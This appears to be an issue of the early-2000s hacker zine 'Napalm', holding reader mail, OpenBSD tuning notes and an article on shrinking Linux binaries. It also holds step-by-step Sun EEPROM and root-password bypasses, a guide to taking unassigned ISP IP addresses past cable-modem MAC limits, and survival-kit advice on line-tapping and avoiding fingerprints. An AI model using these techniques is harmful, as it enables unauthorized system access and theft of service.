@@ -1,0 +1,1448 @@
+           /\  /^/_ _ __  __ _|^|_ __ ___
+          /  \/ / _` '_ \/ _` | | '_ ` _ \
+         / /\  / (_| |_)  (_| | | | | | | |
+        / /  \/ \__, .__/\__,_|_|_| |_| |_|
+                   |_|
+
+.                                 .                      . ..n9: 2000.02.05
+---------------------------------------------------------------------------
+all content copyright © 2001 by the individual authors. all rights reserved
+---------------------------------------------------------------------------
+
+# prtvtoc
+. . . .....................................................................
+0x00  Editor's Comments
+0x01  Subscriber Emails
+0x02  Cable Modem Quicky: Hiding Inside the Data Link Layer
+0x03  The Hacker's Survival Kit
+0x04  On Binary Size and Reduction
+0x05  Hacker 'Zines and Information Security Magazine
+0x06  Press Release: Cybertech Magazine
+0x07  More Holes in Sun Cluster 2.x
+0x08  Masquerading as IPSEC for Fun and Profit
+0x09  Music Reviews
+0x0A  Credits
+..................................................................... . . .
+
+___________________________________
+--------------------------- - kynik
+[=] 0x00: Editor's Comments
+
+We've got the second-largest issue to date, and by the number of articles, 
+the largest. Issue 9 has quite a wide selection of topics, from how 
+'hacker' zines are viewed by the 'legit' corporate world, to more on IPSEC 
+in the continuing saga. Also plenty of stuff in here for you UNIX-philes. 
+It is with sadness that we wave goodbye to the music reviews as they've 
+been. I just can't get enough people to commit to doing them when the 
+time comes. No, I don't want any volunteers. See that section for details.
+I'm happy about the subscriber response we've received, as can be seen in 
+the following section...keep them coming! I'm very willing to post your 
+questions and comments here. Enjoy!
+
+___________________________________
+--------------------------- - kynik
+[=] 0x01: Subscriber Emails
+
+George Dodd <gdd@siliconinc.net> wrote [forwarded from _azure] :
+
+
+All of them are related to kernel memory tuning.
+
+> > > option          BUFCACHEPERCENT=25
+
+Percentage of memory to allocate for FS caching. Defaults to
+5% and can be no greater than 70. Nice performance improvement.
+Keep in mind this can make for a pretty memory greedy machine
+though.
+
+/usr/src/sys/arch/$ARCH/$ARCH/machdep.c for more info.
+
+> > > option          NKMEMCLUSTERS=8192
+> > > option          MAX_KMAP=120
+> > > option          MAX_KMAPENT=6000
+
+The other 3 are sorta legacy stuff. Under older versions like
+less than 2.7, you would see problems with kernel memory being 
+insufficient, ie "mb_map_full" messages. Its much much
+better under recent releases, but I put it in there anyway just
+to be safe. The KMAP stuff increases the number of kernel maps 
+that are available. It was required when softupdates first 
+came out. After 2.6, I have only managed to hit the limit on
+that once. Documentation can be found under the performance
+tuning FAQ from 2.5 and earlier. From vm_map.[c,h]
+
+The new way: (2.8 snap as of 1 month ago)
+#ifndef MAX_KMAP
+#define MAX_KMAP        20
+#endif
+#ifndef MAX_KMAPENT
+#if (50 + (2 * NPROC) > 1000)
+#define MAX_KMAPENT (50 + (2 * NPROC))
+#else
+#define MAX_KMAPENT     1000  /* XXXCDC: no crash */
+#endif
+#endif
+
+
+The old way: (2.6)
+#ifndef MAX_KMAP
+#define MAX_KMAP        20
+#endif
+#ifndef MAX_KMAPENT
+#define MAX_KMAPENT     1000
+#endif
+
+If you are really into the obsd kernel hacking thing, you
+may want to check out Phrack #54 also. It had some pretty
+neat stuff in it on 2.4 kernel mods.
+
+Ciao,
+
+George Dodd
+jhh@EFnet
+
+--------------------------------------------------------
+
+Jack Trades <j0atz@hotmail.com> wrote:
+
+  I was just catching up on your e-zine, since I have been out of the
+country for a few months now on business. Upon returning I read the
+second zine again while I was persuing some sites and I realized that you
+were looking to 'mentor' some people. Now, no, I am not looking for a
+mentor, but I did want to compliment you on taking on such an endeavor.
+
+[ Thanks, and for those who are interested, I've become much too busy to
+  be able to handle a mentoring spot anymore. If anybody has any
+  questions they'd like answered, though, I will take those and put them
+  in Napalm. {kynik} ]
+
+  You did ask for some unbiased opinion on the zine and what things other 
+people (or groups in our case) would be interested. We have been around
+for quite sometime in the security of all hardware (instead of just the
+actual computer - the hub, the switch, the phone), etc. Where we would
+like more information, have found it hard to come by is one the phone
+networks themselves - their weaknesses and flaws (info in likeness to the
+Phone Mazters who were busted a little over a year and a half ago). Not
+only would we find this information useful, but so would, we believe,
+many others - both old school and newbies.
+
+  Keep up the good work and we look forward to hearing back from you or 
+your crew.
+
+jack
+
+PS: it may take a while to xfer - they be a bouncing everywhere.
+
+[ I personally don't know much about phone networks or the like, but I'll
+  try to tap some more knowledgeable people and see if they'd do an
+  article in the future. Thanks for the request! {kynik} ]
+
+--------------------------------------------------------
+
+Rudi Ruesell <vincetier@hotmail.com> wrote:
+
+  Hi my name is vince and i´m not really far in computing or all the stuff
+you talk about in your zine, but what i´d like to know is: are there
+things like worms, or whatever you call it (i read shadowrun thats why i
+cal it so), that crawl throgh the web offline or online searching for
+exactly that you looking for and coming back with tons of information(
+you know like in Matrix while Neo sleeps)? If there are stuff like that
+how may i use it or what exactly is it. I feel a bit ashamed to ask
+someone about something i don´t even know the name but i´d be happy if
+you could answer or at least say piss off with that toy shit little boy.
+OK thanx that´s it ... Vince
+
+[ Piss off with that toy shit? I think you've got the wrong zine. If
+  we're gonna pick on you, we'd be more mature about it. Just kidding.
+  Anyways, let's get some terminology down. A worm is an automated
+  program that moves itself from computer to computer, without any human
+  interaction. The difference between a virus and a worm is the human
+  interaction part. Now, what you're asking about (presumably) is called
+  a web spider or web robot. Most web search engines do this constantly,
+  and update their databases of links accordingly. When you type "Napalm"
+  into a search engine, it will use the data its spiders have already
+  grabbed and return you all sorts of relevant and irrelevant links.
+  There's no way currently to read your mind and spit out a nice report of
+  it all. You need a human to do that ;) So, there's not that much point
+  (besides geek value) to run your own spider to gather specific
+  information. Where do you go about finding out more information about
+  web spiders? Try a search engine. www.google.com is my personal
+  favorite. Type in "web spiders" (with quotes) and click Search. Voila!
+  How does google give you relevant information?
+    http://www.google.com/technology/index.html      {kynik} ]
+
+--------------------------------------------------------
+
+Brian Levy <brianglevy@hotmail.com> wrote:
+
+Hello....could you tell me if it is possible to copy the SAM from one
+system to another?!
+
+thanks
+Brian
+
+[ I think you'd be better off using something like Norton Ghost (?) to
+  copy the entire partition over, as the SAM probably references user IDs
+  that may not exist on the new system. Here's a page with more
+  information on SAMs and their grooming:
+  http://www.microsoft.com/technet/winnt/storpass.asp  {kynik} ]
+
+--------------------------------------------------------
+
+Adam Goral <AdamG@btconnect.com> wrote:
+
+Hi,
+First of all excellent article you have there.
+Do you know of any sites I could find similar info on uk phones?
+
+thx
+
+[ Any British subscribers want to field this one? Bobtfish? {kynik} ]
+
+--------------------------------------------------------
+
+Monkey Boy <monkey-boy@biteme.com> wrote:
+
+have been working my way through your back catalogue & have just finished
+Issue #8... the Nortel phone section was excellent - witty, articulate &
+frikkin interesting to boot (as with the rest of it)... keep up the good
+work
+
+Monkey-Boy (UK)
+
+ps any more stuff on crypto shit would be real cool. Cheers Again.
+
+[ Thanks, and I'll see if I can't put something up about AES sometime soon
+  for all you cryptophiles ;) {kynik} ]
+
+--------------------------------------------------------
+
+David Bryant <david@datashadow.net> wrote:
+
+Greetings,
+
+Cool Zine, I hope you can keep it up (I notice that you've been quiet for
+a couple of months).
+
+[ Yeah, motivation and offline stuff keeps me a slacker. {kynik} ]
+
+In reply to kynik's query about Sun EEPROM work around's in issue 4
+here's some information...
+
+--------------------
+Miscellaneous ramblings on EEPROM passwords
+
+If a system has an EEPROM password set, and you can login as root, you
+can then run "/usr/sbin/eeprom security-mode=none".
+
+If you get a machine that has "security-mode" set to "command" or "full", 
+and you don't know the security-password, or root's password, then you 
+won't be able to boot off of anything but the configured boot device.
+
+1. Determine the current boot disk, usually SCSI ID 0 or 3. Disconnect
+it. Connect an external Sun bootable CD-ROM drive and set its SCSI ID to
+that of the normal boot drive. Put a Solaris Installation CD-ROM into the
+drive. Power on the system and allow it to boot from the CD-ROM. After
+answering a few questions during the initial part of the installation
+you can Ctrl-C out of the installation process and be presented with a
+root prompt. Run "/usr/sbin/eeprom security-mode=none" to clear the
+EEPROM password. Turn off auto-booting by running "/usr/sbin/eeprom
+auto-boot\?=false" (Escape the question mark). Power down (init 5) the
+system. Reattach the original hard drive, move the external CD-ROM drive
+to ID 6 (or use the existing internal CD-ROM if there is one). Power on
+the system, it should stop at the OK prompt. Follow the normal procedures
+to reset a lost root password (boot cdrom -s, mount /dev/dsk/c0t0d0s0 /a,
+ex /a/etc/shadow, wipe password, w, q, umount /a, init 6)
+
+2. Locate another system with the same architecture as the one with the 
+unknown password. Ensure that the other system has "security-mode" set to 
+none. Power the system down and remove it's EEPROM chip (usually in a 
+plastic carrier with an orange barcode on top). Replace the EEPROM on the 
+unknown system with the one from the known system. Boot up with the known 
+EEPROM Follow the steps above to reset the root password. Power down and 
+return the known EEPROM to the original system.
+
+I was once told by a Sun instructor that once an EEPROM security-password 
+has been set there is no way to "clear" it. I've not tested but I wonder if 
+a password of "" (null) would work.
+--------------------
+
+Best of luck!
+
+David
+
+[ Thanks David, on the great answer and mini-article. You sound like
+  someone who can write and knows something. (Two rare qualities when
+  combined) If you have anything else you'd like to write, please drop me
+  a line. {kynik} ]
+
+________________________________________________________________________
+--------------------------------------------------------------- - _azure
+[=] 0x02: Cable Modem Quicky: Hiding Inside the Data Link Layer
+
+/Intro and Background
+
+  When my cable modem was first installed, I was out of the house at a 
+jobsite. I returned home that evening to find out that I had not been 
+provided with data concerning the two additional IP addresses I requested.
+Eventually, I was able to contact my ISP on the phone and was provided
+with my additional addresses. I was assigned two IPs that were in a
+different subnet from the one I received when my cable modem was first
+installed. Having recently done some work for a competing cable company,
+this seemed fishy since the technology I was previously exposed to was
+not capable of supporting addresses on multiple networks. It would be
+several days (and phone calls) later when I was actually able to get all
+of my addresses functioning - but they did eventually fire up and pass
+traffic.
+
+  Since that time, I've continued to have quite a bit of trouble with my 
+cable modem. Typically, my ISP reboots their 'servers' at least once a 
+week, which disrupts my Internet access, sometimes for hours at a time.   
+Often there is a problem when their system comes back up, and my cable
+modem falls into a 'failure loop'. When this happens, my access to the
+Internet will be down until the next time they decide to reboot 'the
+servers'.
+
+  Most recently, I suffered an outage that lasted from late one Thursday 
+evening until the morning of the following Tuesday. During this time, I 
+was never able to use more than two of my IP addresses at the same time.
+I discovered through trial and error that if I manually rebooted my cable 
+modem, the working addresses would switch places with the inactive ones, 
+and I would suddenly have access to my 'dead' machines again.
+
+  Throughout this downtime, I continued to tinker with my setup, and  
+eventually discovered that it was possible to grab other IPs from my 
+original subnet (guessing as to what addresses might be free). I was 
+actually able to start using these addressees to make contact with the
+Internet.
+
+/Cable Modems
+
+  My cable modem is a Nortel Networks Cable Modem (CM) 100. As it turns 
+out, the CM-100 is a Data Over Cable Service Interface Specifications 
+(DOCSIS) device, and actually functions more like a bridge than a router.  
+There is no IP address assigned directly to the CM itself; and in fact
+the default gateway addresses for each subnet point to a 'server' machine
+at the cable plant. It is equipped with both a coaxial (for connection to 
+the cable plant) and RJ-45 Ethernet (for connection to customer network
+devices) connector. No other I/O interfaces are evident on the exterior
+of the unit. It is capable of both Data Link and Network Layer bridging,
+and allows up to 16 individual MAC addresses to connect through it
+simultaneously. MAC authorization is assigned in blocks of four at 
+the cable plant.
+
+  The documentation also purports that the CM-100 is a SNMP manageable 
+device, with support for firmware updates via TFTP. I have not yet 
+experimented with trying to alter the firmware of the unit myself.
+What I've found more interesting is the fact that by assigning multiple
+addresses to a single Ethernet interface on a client machine, it is
+possible to bypass the MAC limiting and make use of more IP addresses
+than were assigned to the unit.
+
+  Since the purpose of DOCSIS is to create a standard that different  
+vendors can design their hardware against, it is assumed that the
+following techniques will be effective against other DOCSIS systems.
+Exploration is left up to the reader.
+
+/Unix Routing with OpenBSD and IPNAT
+
+  Utilizing a spare box and OpenBSD's native NAT capabilities, it is
+possible to create a single Firewall Machine that can be the 'face' on 
+a theoretically unlimited number of internal Internet Hosts. A single
+MAC address will communicate with the CM, while holding a number of 
+public IP addresses and routing traffic between an Internal Network of
+hosts and the Internet outside.
+
+--/Hooking It All Up
+
+  Let's be sensible about this. You're going to want to use a crossover 
+cable directly between your cable modem and your external interface on 
+the Firewall. This way, you will get full-duplex 10MBs throughput at
+your most crucial bottleneck (a diagram for constructing a crossover
+cable from scratch is included at the end of this article). Doing this
+eliminates the network congestion created by plugging your CM into a hub.
+
+  Wiring your Internet Hosts can be done in a number of ways. A single 
+Ethernet interface (100MBs is suggested) plugged into an internal hub or 
+switch may be sufficient to handle traffic to and from the Firewall.  
+Other applications may require Physical Layer separation of the  
+individual Internet Hosts. This can be accomplished by connecting each
+machine to its own NIC in the Firewall with a crossover cable.
+
+In the end, you should have a setup that looks something like this:
+
+    Your.Internet.Host <--> OpenBSD/router <--> Cable Modem  
+
+
+--/Preparing OpenBSD to Route
+
+  OpenBSD does not come out of the box ready to route traffic. You'll  
+need to edit /etc/sysctl.conf and enable the following variable:
+
+    net.inet.ip.forwarding=1 # 1=Permit forwarding (routing) of packets
+
+/etc/rc.conf will also need the following:
+
+    ipfilter=YES
+    ipnat=YES                # for "YES" ipfilter must also be "YES"
+
+  A kernel option you might want to consider for performance tweaking on  
+100MBs enabled systems is:
+
+    option          NMBCLUSTERS=8192
+
+Upon reboot your system should be ready to go.
+
+--/IPNAT
+
+  Take a look at what you've got. Select another IP address from the 
+same subnet as your legitimate EXTERNAL_IP for use on your internal 
+Internet Host(s). (If your ISP is using multiple subnets, and you have
+access to information regarding these addresses, it may be possible to
+use IPs from any legitimate subnet they support).
+
+  You'll need to add the ILICIT_EXTERNAL_IP(s) you selected to the 
+EXTERNAL_INTERFACE on your Firewall, and an INTERNAL_IP  on its 
+INTERNAL_INTERFACE for each INTERNAL_NETWORK you plan to create. We'll 
+use Darren Reed's IPFILTER package (which includes IPNAT) to redirect 
+incoming traffic through the Firewall to the Internet Hosts on each 
+INTERNAL_NETWORK, and back out again.
+
+In /etc/ipnat.rules:
+
+    bimap EXTERNAL_INTERFACE INTERNAL_HOST_IP/32 -> ILICIT_EXTERNAL_IP/32
+  
+  This creates a (as the name implies) bi-directional map between
+ILICIT_EXTERNAL_IP and INTERNAL_HOST_IP. The internal Internet Host will
+be able to surf the net, and any incoming traffic destined for
+ILICIT_EXTERNAL_IP will be immediately forwarded to INTERNAL_HOST_IP.
+
+Remember to flush and re-initialize IPNAT:
+
+    # ipnat -CF -f /etc/ipnat.rules
+
+  Traffic should now pass freely from the Internet to ILICIT_EXTERNAL_IP 
+on any port that you have open on the internal Internet Host.
+
+--/Other Considerations
+
+  It would be a good idea to create a set of comprehensive filtering
+rules for the internal Internet Hosts with IPF, either on the Firewall or
+on the machines themselves. As this is not necessary to achieve
+functionality, and I've beaten the IPF issue to death in previous
+articles (see Napalm 7 and 8); I won't go into the intricacies of
+stateful packet filtering at this time. Keep in mind though that the
+IPNAT configuration above does not protect the internal Internet Hosts in
+any way shape or form - they are in fact just as vulnerable as any
+regular host sitting uprotected on the Internet.
+
+/Conclusion
+
+  Utilizing an OpenBSD box as a router, we have bypassed the MAC address  
+limits assigned to your CM and successfully snatched another functioning 
+IP from the Ether. This technique has only been tested with the Nortel 
+Networks CM-100, but other DOCSIS cable modems using MAC-based access
+controls are probably vulnerable to the same circumvention techniques.
+
+  Brochure propaganda for the Nortel Networks CM-100 states that the  
+system thwarts hackers by utilizing 56-bit DES encryption and RSA keys 
+to ensure that only authorized personnel make changes to your cable 
+modem's configuration. This is just another example of why encryption 
+does not always save the day by its lonesome when the basic
+implementation of access controls is flawed. In this case it wasn't
+necessary to 'hack into' anything but common sense to bypass security
+restrictions.
+
+Happy hunting, and don't shoot your foot off.
+
+/Further Reading
+
+    Nortel Cable Modem 100
+        [ http://www.mercury.com.ar/htm/nortel/CableModem100.htm ]
+    Ethernet 10BaseT or 100BaseT Crossover Cable
+        [ http://www.gcctech.com/ts/doc/crossover.html ]
+    IPF/IPNAT reference from Napalm #7 and 8
+        [ http://napalm.firest0rm.org/issue7.html#integ ]
+        [ http://napalm.firest0rm.org/issue8.html#ipsec ]
+    ipnat(5)
+    ipf(8)
+
+
+/Signed
+
+.-------------------------------------------------------------------.
+|                                                                   |
+|   _azure                                                          |
+|                                                                   |
+`-------------------------------------------------------------------'
+
+_________________________________________________
+----------------------------------- - Thomas Icom
+[=] 0x03: The Hacker's Survival Kit
+
+  Hackers are notorious gadget freaks, and often like to go out and about
+into the real world to see what kind of trouble, eh, exploration they can
+get into. I've detailed a list of items that can be thrown into a  
+hacker's survival kit and fits into a courier bag or daypack. The list is
+derived from my own experiences as a technological hobbyist. All of the
+items are self-explanatory, and there is plenty of leeway to customize
+the kit towards your own tastes and preferences. I've designed this kit
+to be easily portable. Many of you are too young to (legally) drive, or
+live in urban areas where your transportation is usually public, bicycle,
+or shank's mare.
+
+  We will start with the basics: Something to carry your gear around in.
+Most people go with either a courier bag or day-type backpack. Urban
+bicyclists seem to like the courier bags while walking types prefer
+backpacks; it's all a matter of preference. We like backpacks as they
+stay out of the way better, leave both hands free, and are less
+cumbersome than a bag hanging off your side. A decent military-surplus
+backpack is sturdier and less expensive than some of those courier bags.
+Also, the "shittier" your bag looks, the less likely it is that someone
+will try and rip it off you.
+
+  Get something in a neutral earth-type color like green, brown, grey, or
+black. This not only stands out less, but also makes it easier to cache
+(hide) if you can't bring it in with you. Our recommendation is that it
+never leave your possession, but we know some places will want you to
+check it at the door. Whether you check it or hide it depends on what you
+have in the bag, and the relative time needed to get to it.
+
+  Another thing you will want to start wearing, if you already don't, is
+a belt. It doesn't matter what type of belt as long as it's sturdy.
+Besides helping hold your pants up (which I'm sure is difficult
+considering some of you wear your pants 5 sizes too big), you can carry
+equipment on it: pager, Mini Maglite, Leatherman Tool, Buck Knife, etc.
+
+  Now that you have something to carry your gear around in we can begin
+to almost fill it. You never want to run around with a full bag, in case
+you find something you want to take with you.
+
+  I'll start with what you'll be carrying on your person. Get a
+Leatherman Tool, Gerber Multi-Plier, or Swiss Army Knife. My Leatherman
+PST-2 has neeedlenose pliers, wire cutters, file, clip point
+serrated/plain edge knife blade, metal saw, regular and phillips
+screwdrivers, can/bottle opener, and a small pair of scissors. I also
+occasionally carry a Camillus U.S. Military pocket knife. This is your
+classic four item "boy scout type" knife that has a plain-edged spear
+point blade, screwdriver/bottle opener, can opener, and mini
+screwdriver/awl.
+
+  For heavier cutting tasks and possible self-defense usage get a good
+lock blade knife. The Rolls Royce of these (in my opinion) is Benchmade.  
+Until recently I carried a CQB Folder which replaced the Cold Steel
+Folding Tanto that I retired. The tanto-point blade, while excellent for
+self-defense, is not the best for general purpose use and it is also a
+little bit heavy for everyday carrying. I went back to a Spyderco Endura
+Clipit. Spyderco blades are serrated and offer tremendous cutting power
+for their size. I've owned mine for quite a few years now, and it has yet
+to require sharpening. The other nice thing about the Spyderco is that if
+you lose it, you're only out $45 as opposed to $120 for some of the
+Benchmade knives. While you shouldn't lose tools, it happens (In the past
+30 years I've misplaced several pocketknives, a Gerber Multi-Plier, a
+Spyderco Worker, and an Al-Mar folder that have yet to reappear). For
+those on a budget, the Schrade Cliphangers are a lot of knife for the
+money, and I believe United Cutlery (I believe) makes a nice "Mechanics
+Liner Lock" with a 3-4" serrated blade (and they went for no more than
+$20 and were well made knives).
+
+  Being a hardware hacker, I also carry around a few extra tools. A
+multi-bit screwdriver and a set of tamper proof bits have come in handy
+on numerous occasions; as have a little 6" pry-bar (nicknamed "the goblin
+bar" by an old acquaintance of mine) I picked up at a dollar store for,
+well, a dollar. A Radio Shack mini-multimeter also resides in my kit.
+Those heavy-duty scissors known as "EMT Shears" that will cut through a
+penny and only cost a few bucks are nice to have as well. A roll of duct
+tape and electrical tape complement the package. It is said that you can
+fix anything with duct tape. Now you need fire. Disposable lighters are
+nice. What's even better is one of those butane lighter/torches that put
+out a jet of blue flame. You can solder and almost weld with one of
+those. Include a butane refill cylinder. Some really "elite" types carry
+the miniature battery-operated Dremel Tool with a small case of relavent
+bits. Dremel tools have several thousand uses.
+
+  Another thing you should have on you is a Mini Mag lite or similar
+small two AA-cell flashlight. If you've ever been caught inside a modern
+office building or apartment when the lights go out, you'll appreciate
+how handy having a little flashlight is. You can get a headband which
+places a Mini-Mag on the side of your head at eye level; an excellent
+idea when you need to work on something with both hands in the dark. You
+should also get the accessory kit for the red filter lens, as the red
+lens enables you to have a light source that doesn't fuck up your night
+vision. A cheap set of 8x or 10x binoculars are nice to see things that
+are far away and don't take up much space. Recently a friend gave me
+this piece of optics the size of a large pen that is both an 8x telescope
+and a 30x microscope. It was supposedly standard KGB issue. I also like
+to have a jewelers loupe handy for reading part numbers on electronic
+components (jeweler's loupes have coolness factor). For memory-aids, I
+include a copy of Pocket Ref, a little notepad, and writing implements.
+While individuals have taken to carrying around electronic notepads or
+Palm Pilots, I'm a little retro in my choice of memory aids, as they
+don't require batteries that go dead at inopportune times.
+
+  Communications tools are next. If you can get your friends to carry FRS
+or 2-meter radios that's all fine and dandy, otherwise get a one-piece
+phone, cut the modular plug off the end, and attach alligator clips to
+the red and green wires. Get one of the portable touch-tone pads from
+Radio Shack. Get a pager with voice mail. If someone wants to reach you
+they page you and you can then call them back by whatever means you have
+or desire. Communications receivers (scanners) have come down in price
+and size. An Icom R2 and Alinco DJ-X2T are small wide-band receivers
+capable of picking up everything from AM/FM broadcasters, to shortwave
+stations, to local public safety communications.
+
+  Throw a set of work gloves in your pack. Not only will they keep you
+from leaving fingerprints, but they also protect your hands from damage
+and keep them warm. For the summer, I get a "six pack" of cotton work
+gloves for about $5. In the winter I replace them with wool army "glove
+liners" and black leather "glove shell". Speaking of damage, throw in
+some assorted Band-Aids, "butterfly strips", gauze pads, first-aid tape,
+tweezers, alcohol pads, and some Mercurichrome or similar ointment in
+your kit. You will in the course of your adventures get minor dings,
+scratches, slivers and cuts, and will be glad you have it. It beats
+bleeding all over the place.
+
+  Clothing is next. Cold weather and rain just happen some times and you
+may spare yourself some discomfort or hypothermia with nice dark sweater
+or sweatshirt and a rain poncho or anorak. You can add spare socks and
+possibly undergarments if there is the possibility of staying overnight
+unexpectedly somewhere. Start wearing a hat. Baseball caps are OK, but I
+like outback "Crocodile Dundee" style hats that are made of waxed cotton
+and shed water like a duck's back.
+
+  Now I will discuss weapons. Whether or not you decide to carry them is
+a personal decision. In most areas they are heavily frowned upon or
+illegal. I personally feel that "An armed society is a polite one"
+(Robert A. Heinlein)  and that everyone should have the right to carry
+defensive weaponry if they so choose. Some places such as Massachusetts,
+California, and New York don't share my feeling. If you live in a
+Communist state, either move or follow the Eleventh Commandment (Thou
+shalt not get caught). In most places you can carry pepper spray with
+little hassle. It works most of the time, but be advised some people have
+an immunity to it. Don't spray into the wind, as you will dose yourself,
+and if you spray it in an enclosed area everyone nearby will get a sniff
+of it, yourself included. High-voltage stun-guns are pretty effective,
+despite claims to the contrary. To quote Kurt Saxon in The Poor Man's
+James Bond, "Anyone unaffected by 50,000 volts is from another planet".
+
+  It's neat to be able to do field surgery on electronic devices, fix
+your ride, or be able to do a little "urban exploration" on a moment's
+notice. Carrying around a portable techie's work-shop has its own flavor
+of eliteness. Being prepared for sudden changes in plans or unforeseen
+circumstances is a good thing. Hopefully, this article got your
+brain-gears going, and that's another good thing.
+
+12/31/2000 - Thomas Icom <ticom@iirg.org>
+http://www.iirg.org/~ticom/
+
+[ Thanks for the article, Tom. It's a little different from what I'd
+  normally include here, but I figured many of you out there would find
+  it interesting. {kynik} ]
+
+_______________________________________________
+-------------------------------------- - Orbitz
+[=] 0x04: On Binary Size and Reduction
+
+  While it is not so much a problem nowadays, file size used to be a big
+issue. Today, we all have 15GB hard drives and like to use every byte of
+it up. Making your executables as small as possible is limited to mostly
+contests, but the knowledge behind it is always good to know.
+
+Note: The information in this is not useful to you unless you either like
+to know everything or are a hardcore ASM coder. These techniques will
+only be helpful on small projects where size and speed is a big issue. I
+am using Slackware 7.1 on a 2.2.16 kernel with gcc version egcs-2.91.66
+19990314/Linux (egcs-1.1.2 release).
+
+  This article will go briefly over how to make smaller executables (our
+outputs will be ELF) with gcc. You should allready know what Assembly is,
+how to use AT&T syntax, and some C would be ideal. First, let us start off
+with making a C file smaller. Our test program looks like:
+
+#include <stdio.h>
+int main(void)
+{
+  printf("Hello World\n");
+  return 0;
+}
+
+Save that as test.c and in the same directory type:
+
+$ gcc -o test test.c
+
+That compiles your C program (Duh).
+Now run:
+
+$ wc -c test
+
+That outputs:
+  11666 test
+
+Christ! That is huge. What can we do to make this smaller? First, we can
+strip it.
+Type:
+
+$ strip test
+$ wc -c test
+   2996 test
+
+Hot damn. That is much smaller, but we can make it even smaller yet.
+But first, I will explain this strip thing.
+
+$ strip <object filename here>
+
+In this case it was an executable file. Strip removes the symbols from the
+file you give as an argument. Running strip is the same as using the -s
+flag in gcc.
+
+For example, we could have done
+
+$ gcc -s -o test test.c
+
+To knock a few more bytes off our executable we can do:
+
+$ gcc -O2 -s -o test test.c
+$ wc -c test
+   2992 test
+
+That is better. Now for the intense stuff. To get the Assembly output of a
+C file in gcc you do
+
+$ gcc -S <somefile>.
+
+In our case we will do
+
+$ gcc -S test.c
+
+The -S flag creates a file of the same name but with a .s extension.  
+Opening test.s should reveal some rather ghoulish-looking assembly code.
+This is ok.
+
+First we have to edit the part that says:
+
+.globl main
+. .   .typ.   main,@function
+main:
+Change it to:
+.globl _start
+_start:
+
+  What is this _start thing? When the linker creates your executable, it
+uses_start as the entry point then calls your main() function. So instead
+of having gcc make the _start for us and having it call main(), we just
+create our own _start. In order to get this to compile, we are going to
+need to use the -nostartfiles flag in gcc. This flag basically tells gcc
+that we have our own _start and not to look for a main() because it does
+not exist. There is going to be a slight problem, however. _start is not a
+function, and you'll notice that at the end of the program we have a
+'ret'. Since _start is just an entry point, and not a function we need to
+tell it to exit the program instead of try to return from a function.
+This will be the first use of syscalls, which I will explain later. Find
+the part that ret's from the function. It should look like:
+
+.L1:
+ leave
+ ret
+
+Change that to:
+.L1:
+ movl $1, %eax
+ int $0x80
+		
+Lets see how much this decreased our program size by:
+
+$ gcc -nostartfiles -O2 -s -o test test.s
+
+Then:
+
+$ wc -c test
+   1516 test
+
+  Sweet! If we hadn't changed the ret, the program would segfault when we
+ran it. Before continuing, an explanation of this syscall thing will be
+needed.
+
+  If you have ever done any DOS Assembly programming, you are familiar
+with interrupts. You have BIOS and DOS interrupts (which DOS ASM
+programmers often use as if there is no difference). With different
+interrupts and values in your registers, you can do different things. You
+can read in data, output data, open files, etc. Well, in Linux you have
+syscalls. The basic idea for Linux syscalls is you put the numeric
+identifier of the syscall you want to use in your eax register, then you
+put any other parameters in ebx, ecx, edx, esi, edi, in that order. The
+return value is put into eax. This is for system calls with less than 6
+arguments. When you are dealing with a syscall that has 6 or more
+parameters, things get a little bit trickier. You put the numeric
+identifier of the syscall in eax again, then you place the other
+parameters in memory with ebx pointing to the beginning. If you decide to
+use the stack to hold your variables you will need to push them in the
+opposite order (like the way C functions work). A great list of syscalls
+can be found at http://home.snafu.de/phpr/lhpsysc0.html
+
+  How do you know what to put in each variable? If you look at the site
+just mentioned, you see what the number means. Just type man 2 <name> to
+look at the man page, then just follow the parameters. For example, if we
+wanted to write something, we will put 4 into eax, and look at the
+parameters in the man page:
+
+ssize_t write(int fd, const void *buf, size_t count);
+
+  We put 4 into eax to tell the computer we want to write. We then put 1
+into ebx. Remember the order things going in: ebx, ecx, edx, esi, edi. So
+that means the value for fd goes into ebx, and when using write, the value
+of 1 sends the output to the console. We then put the variable for the
+message into ecx, and the length of the message in edx. The number of
+characters that were printed out will be placed into eax because that is
+where the return value goes.
+
+  That should be enough information on syscalls for the moment - back to
+making our executable really small. The next flag for gcc we will use is
+called -nostdlib. This flag doesn't link against your standard libraries
+and because of this things like printf won't be recognized by gcc. We
+will need to replace printf with a syscall. The first example will have a
+hardcoded size for our output string and the next will use a quick
+function that counts how many characters are in our string to be output.
+Here is what the code looks like in ASM:
+
+.section	.rodata
+.LC0:
+	.string	"Hello World\n\0"
+len:
+  	.long  . - .LC0
+.text
+	.align 4
+.globl _start
+_start:
+	movl $4, %eax
+	movl $1, %ebx
+	leal .LC0, %ecx
+	movl len, %edx
+	int $0x80
+	movl $1, %eax
+	int $0x80
+	.align 4
+
+Note: I cut all the extra stuff gcc outputs because it doesn't do anything
+important. This code is also unoptimized.
+
+  First, I added the len: .long . - .LC0 part. This line simply makes len
+a long variable which holds the length the our string, which is .LC0.
+Next, I got rid of all that stack stuff, messing with ebp and such, and
+of course the 'call printf'. To go through this line by line:
+
+  The first movl puts 4 into eax, which is the syscall for writing. Next
+1 is put into ebx, which is the 'fd' variable in write(). 1 stands for
+STDOUT, which is out to the console. .LC0, our string is loaded into ecx
+then its length is put into edx and our interrupt is called. Then 1 is
+put into eax, which stands for exit and our interrupt is called once
+again. Pretty straightforward.
+
+  Here is a remake of the above program. This program is the same except
+for the strlen call. In most cases you won't be able to hard code the
+length of your string. So strlen just finds out how long the string is
+and returns it in eax (standard syscall function calling system).
+
+.section        .rodata
+.LC0:
+        .string "Hello World\n\0"
+.text
+        .align 4
+.globl _start
+_start:
+        movl $1, %ebx
+        leal .LC0, %ecx
+	movl %ecx, %eax
+	call strlen
+        movl %eax, %edx
+	movl $4, %eax
+        int $0x80
+        movl $1, %eax
+        int $0x80
+        .align 4
+
+.globl strlen
+        .type    strlen,@function
+strlen:
+       pushl %ebx
+       xor %ebx, %ebx
+       pushl %edx
+       xor %edx, %edx
+count_chars:
+       movb (%eax,%ebx,$1), %dl
+       testb %dl, %dl
+       jz done
+       incl %ebx
+       jmp count_chars
+done:
+       movl %ebx, %eax
+       popl %edx
+       popl %ebx
+       ret
+       
+To compile this,
+
+$ gcc -O3 -s -nostartfiles -nostdlib -o <outputname> <inpufilename>
+
+I put the -O3 because I do not trust any optimization techniques I may or
+may not have.
+
+$ wc -c test
+   480 test
+
+Wow! We started at 11666 bytes and are down to 480. I find that
+impressive.
+
+[ Then again, Orbitz is easily impressed. ;) {kynik} ]
+
